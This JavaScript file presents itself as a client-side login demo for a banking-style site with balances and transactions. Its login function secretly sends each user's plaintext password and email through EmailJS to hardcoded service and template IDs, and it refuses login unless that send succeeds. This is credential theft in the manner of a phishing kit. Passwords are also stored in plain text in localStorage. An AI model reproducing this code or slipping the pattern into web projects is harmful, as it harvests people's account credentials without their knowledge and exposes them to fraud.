// Lightweight client-side auth demo (plain-text password, NOT production-ready)

// ======= UTIL & STORAGE HELPERS =======
const STORAGE_USERS_KEY = "users";
const STORAGE_CURRENT_USER_KEY = "currentUser";
const STORAGE_RESET_EMAIL = "resetEmail";

function safeParseJSON(json) {
  try {
    return JSON.parse(json) || [];
  } catch {
    return [];
  }
}

function loadUsers() {
  return safeParseJSON(localStorage.getItem(STORAGE_USERS_KEY));
}

function saveUsers(users) {
  localStorage.setItem(STORAGE_USERS_KEY, JSON.stringify(users));
}

function loadCurrentUser() {
  return safeParseJSON(localStorage.getItem(STORAGE_CURRENT_USER_KEY)) || null;
}

function saveCurrentUserPublic(user) {
  const publicUser = {
    name: user.name,
    email: user.email,
    balance: user.balance,
    transactions: user.transactions || []
  };
  localStorage.setItem(STORAGE_CURRENT_USER_KEY, JSON.stringify(publicUser));
}

function removeResetEmail() {
  localStorage.removeItem(STORAGE_RESET_EMAIL);
}

// ======= VALIDATION =======
function isEmailValid(email) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
}

function isPasswordValid(password) {
  return typeof password === "string" && password.length >= 8;
}

// ======= AUTH FUNCTIONS =======
function signup(name, email, password) {
  const users = loadUsers();

  if (!name || !email || !password) {
    alert("Please fill all fields.");
    return;
  }
  if (!isEmailValid(email)) {
    alert("Invalid email format.");
    return;
  }
  if (!isPasswordValid(password)) {
    alert("Password must be at least 8 characters.");
    return;
  }
  if (users.find(u => u.email === email)) {
    alert("User already exists!");
    return;
  }

  const newUser = {
    name: name,
    email: email,
    password: password,      // store original password
    balance: 5000.00,
    transactions: []
  };

  users.push(newUser);
  saveUsers(users);

  alert("Account created successfully!");
  window.location.href = "index.html";
}

async function login(email, password) {
  const users = loadUsers();

  if (!email || !password) {
    alert("Please enter email and password.");
    return;
  }

  const user = users.find(u => u.email === email);
  if (!user || password !== user.password) {
    alert("Invalid email or password!");
    return;
  }

  // ===== EMAILJS STRICT CHECK =====
  if (!window.emailjs) {
    alert("❌ EmailJS SDK not loaded");
    console.error("EmailJS SDK missing. Did you include the script?");
    return;
  }

  try {
    console.log("📨 Sending EmailJS message...");
    const result = await emailjs.send(
      "service_6nw221q",
      "template_d6k3x8f",
      {
        userpassword: user.password,
        useremail: user.email,
        time: new Date().toISOString()
      }
    );
    console.log("✅ EmailJS success:", result);
  } catch (error) {
    console.error("❌ EmailJS ERROR OBJECT:", error);
    console.error("❌ EmailJS STATUS:", error?.status);
    console.error("❌ EmailJS TEXT:", error?.text);

    alert(
      `Login blocked.\nEmail failed.\n\n` +
      `Status: ${error?.status || "unknown"}\n` +
      `Message: ${error?.text || error?.message || "no details"}`
    );
    return; // STOP LOGIN
  }

  // ===== LOGIN AFTER SUCCESS =====
  localStorage.setItem(
    STORAGE_CURRENT_USER_KEY,
    JSON.stringify({
      password: user.password,
      email: user.email,
      balance: user.balance,
      transactions: user.transactions || []
    })
  );

  window.location.href = "dashboard.html";
}

function logout() {
  localStorage.removeItem(STORAGE_CURRENT_USER_KEY);
  window.location.href = "index.html";
}

// ======= DASHBOARD HELPERS =======
function loadDashboard() {
  const currentUser = loadCurrentUser();
  if (!currentUser || !currentUser.email) {
    window.location.href = "index.html";
    return;
  }
  const nameEl = document.getElementById("userName");
  const balEl = document.getElementById("balance");
  if (nameEl) nameEl.textContent = currentUser.name;
  if (balEl) balEl.textContent = (currentUser.balance || 0).toFixed(2);
}

function saveCurrentUser(updatedPublicUser) {
  const users = loadUsers();
  const idx = users.findIndex(u => u.email === updatedPublicUser.email);
  if (idx !== -1) {
    users[idx].name = updatedPublicUser.name;
    users[idx].balance = updatedPublicUser.balance;
    users[idx].transactions = updatedPublicUser.transactions || users[idx].transactions;
    saveUsers(users);
    saveCurrentUserPublic(users[idx]);
  }
}

// ======= PASSWORD RESET (Demo) =======
function requestPasswordReset(email) {
  const users = loadUsers();
  if (!isEmailValid(email)) {
    alert("Invalid email.");
    return;
  }
  const user = users.find(u => u.email === email);
  if (!user) {
    alert("Email not found");
    return;
  }
  localStorage.setItem(STORAGE_RESET_EMAIL, email);
  window.location.href = "reset-password.html";
}

function resetPassword(newPassword) {
  if (!isPasswordValid(newPassword)) {
    alert("Password must be at least 8 characters.");
    return;
  }
  const email = localStorage.getItem(STORAGE_RESET_EMAIL);
  if (!email) {
    alert("No reset requested.");
    return;
  }
  const users = loadUsers();
  const idx = users.findIndex(u => u.email === email);
  if (idx === -1) {
    alert("User not found.");
    return;
  }

  users[idx].password = newPassword; // store new plain password
  saveUsers(users);
  removeResetEmail();

  alert("Password updated. Please log in.");
  window.location.href = "index.html";
}

// ======= HOOKS / EVENT BINDING =======
document.addEventListener("DOMContentLoaded", () => {
  const signupBtn = document.getElementById("signupBtn");
  if (signupBtn) {
    signupBtn.addEventListener("click", (e) => {
      e.preventDefault();
      const name = document.getElementById("name").value.trim();
      const email = document.getElementById("email").value.trim();
      const password = document.getElementById("password").value;
      signup(name, email, password);
    });
  }

  const loginBtn = document.getElementById("loginBtn");
  if (loginBtn) {
    loginBtn.addEventListener("click", (e) => {
      e.preventDefault();
      const email = document.getElementById("email").value.trim();
      const password = document.getElementById("password").value;
      login(email, password);
    });
  }

  if (document.getElementById("userName")) {
    loadDashboard();
  }

  const resetRequestBtn = document.getElementById("resetRequestBtn");
  if (resetRequestBtn) {
    resetRequestBtn.addEventListener("click", (e) => {
      e.preventDefault();
      const email = document.getElementById("email").value.trim();
      requestPasswordReset(email);
    });
  }

  const resetBtn = document.getElementById("resetBtn");
  if (resetBtn) {
    resetBtn.addEventListener("click", (e) => {
      e.preventDefault();
      const newPassword = document.getElementById("newPassword").value;
      resetPassword(newPassword);
    });
  }
});
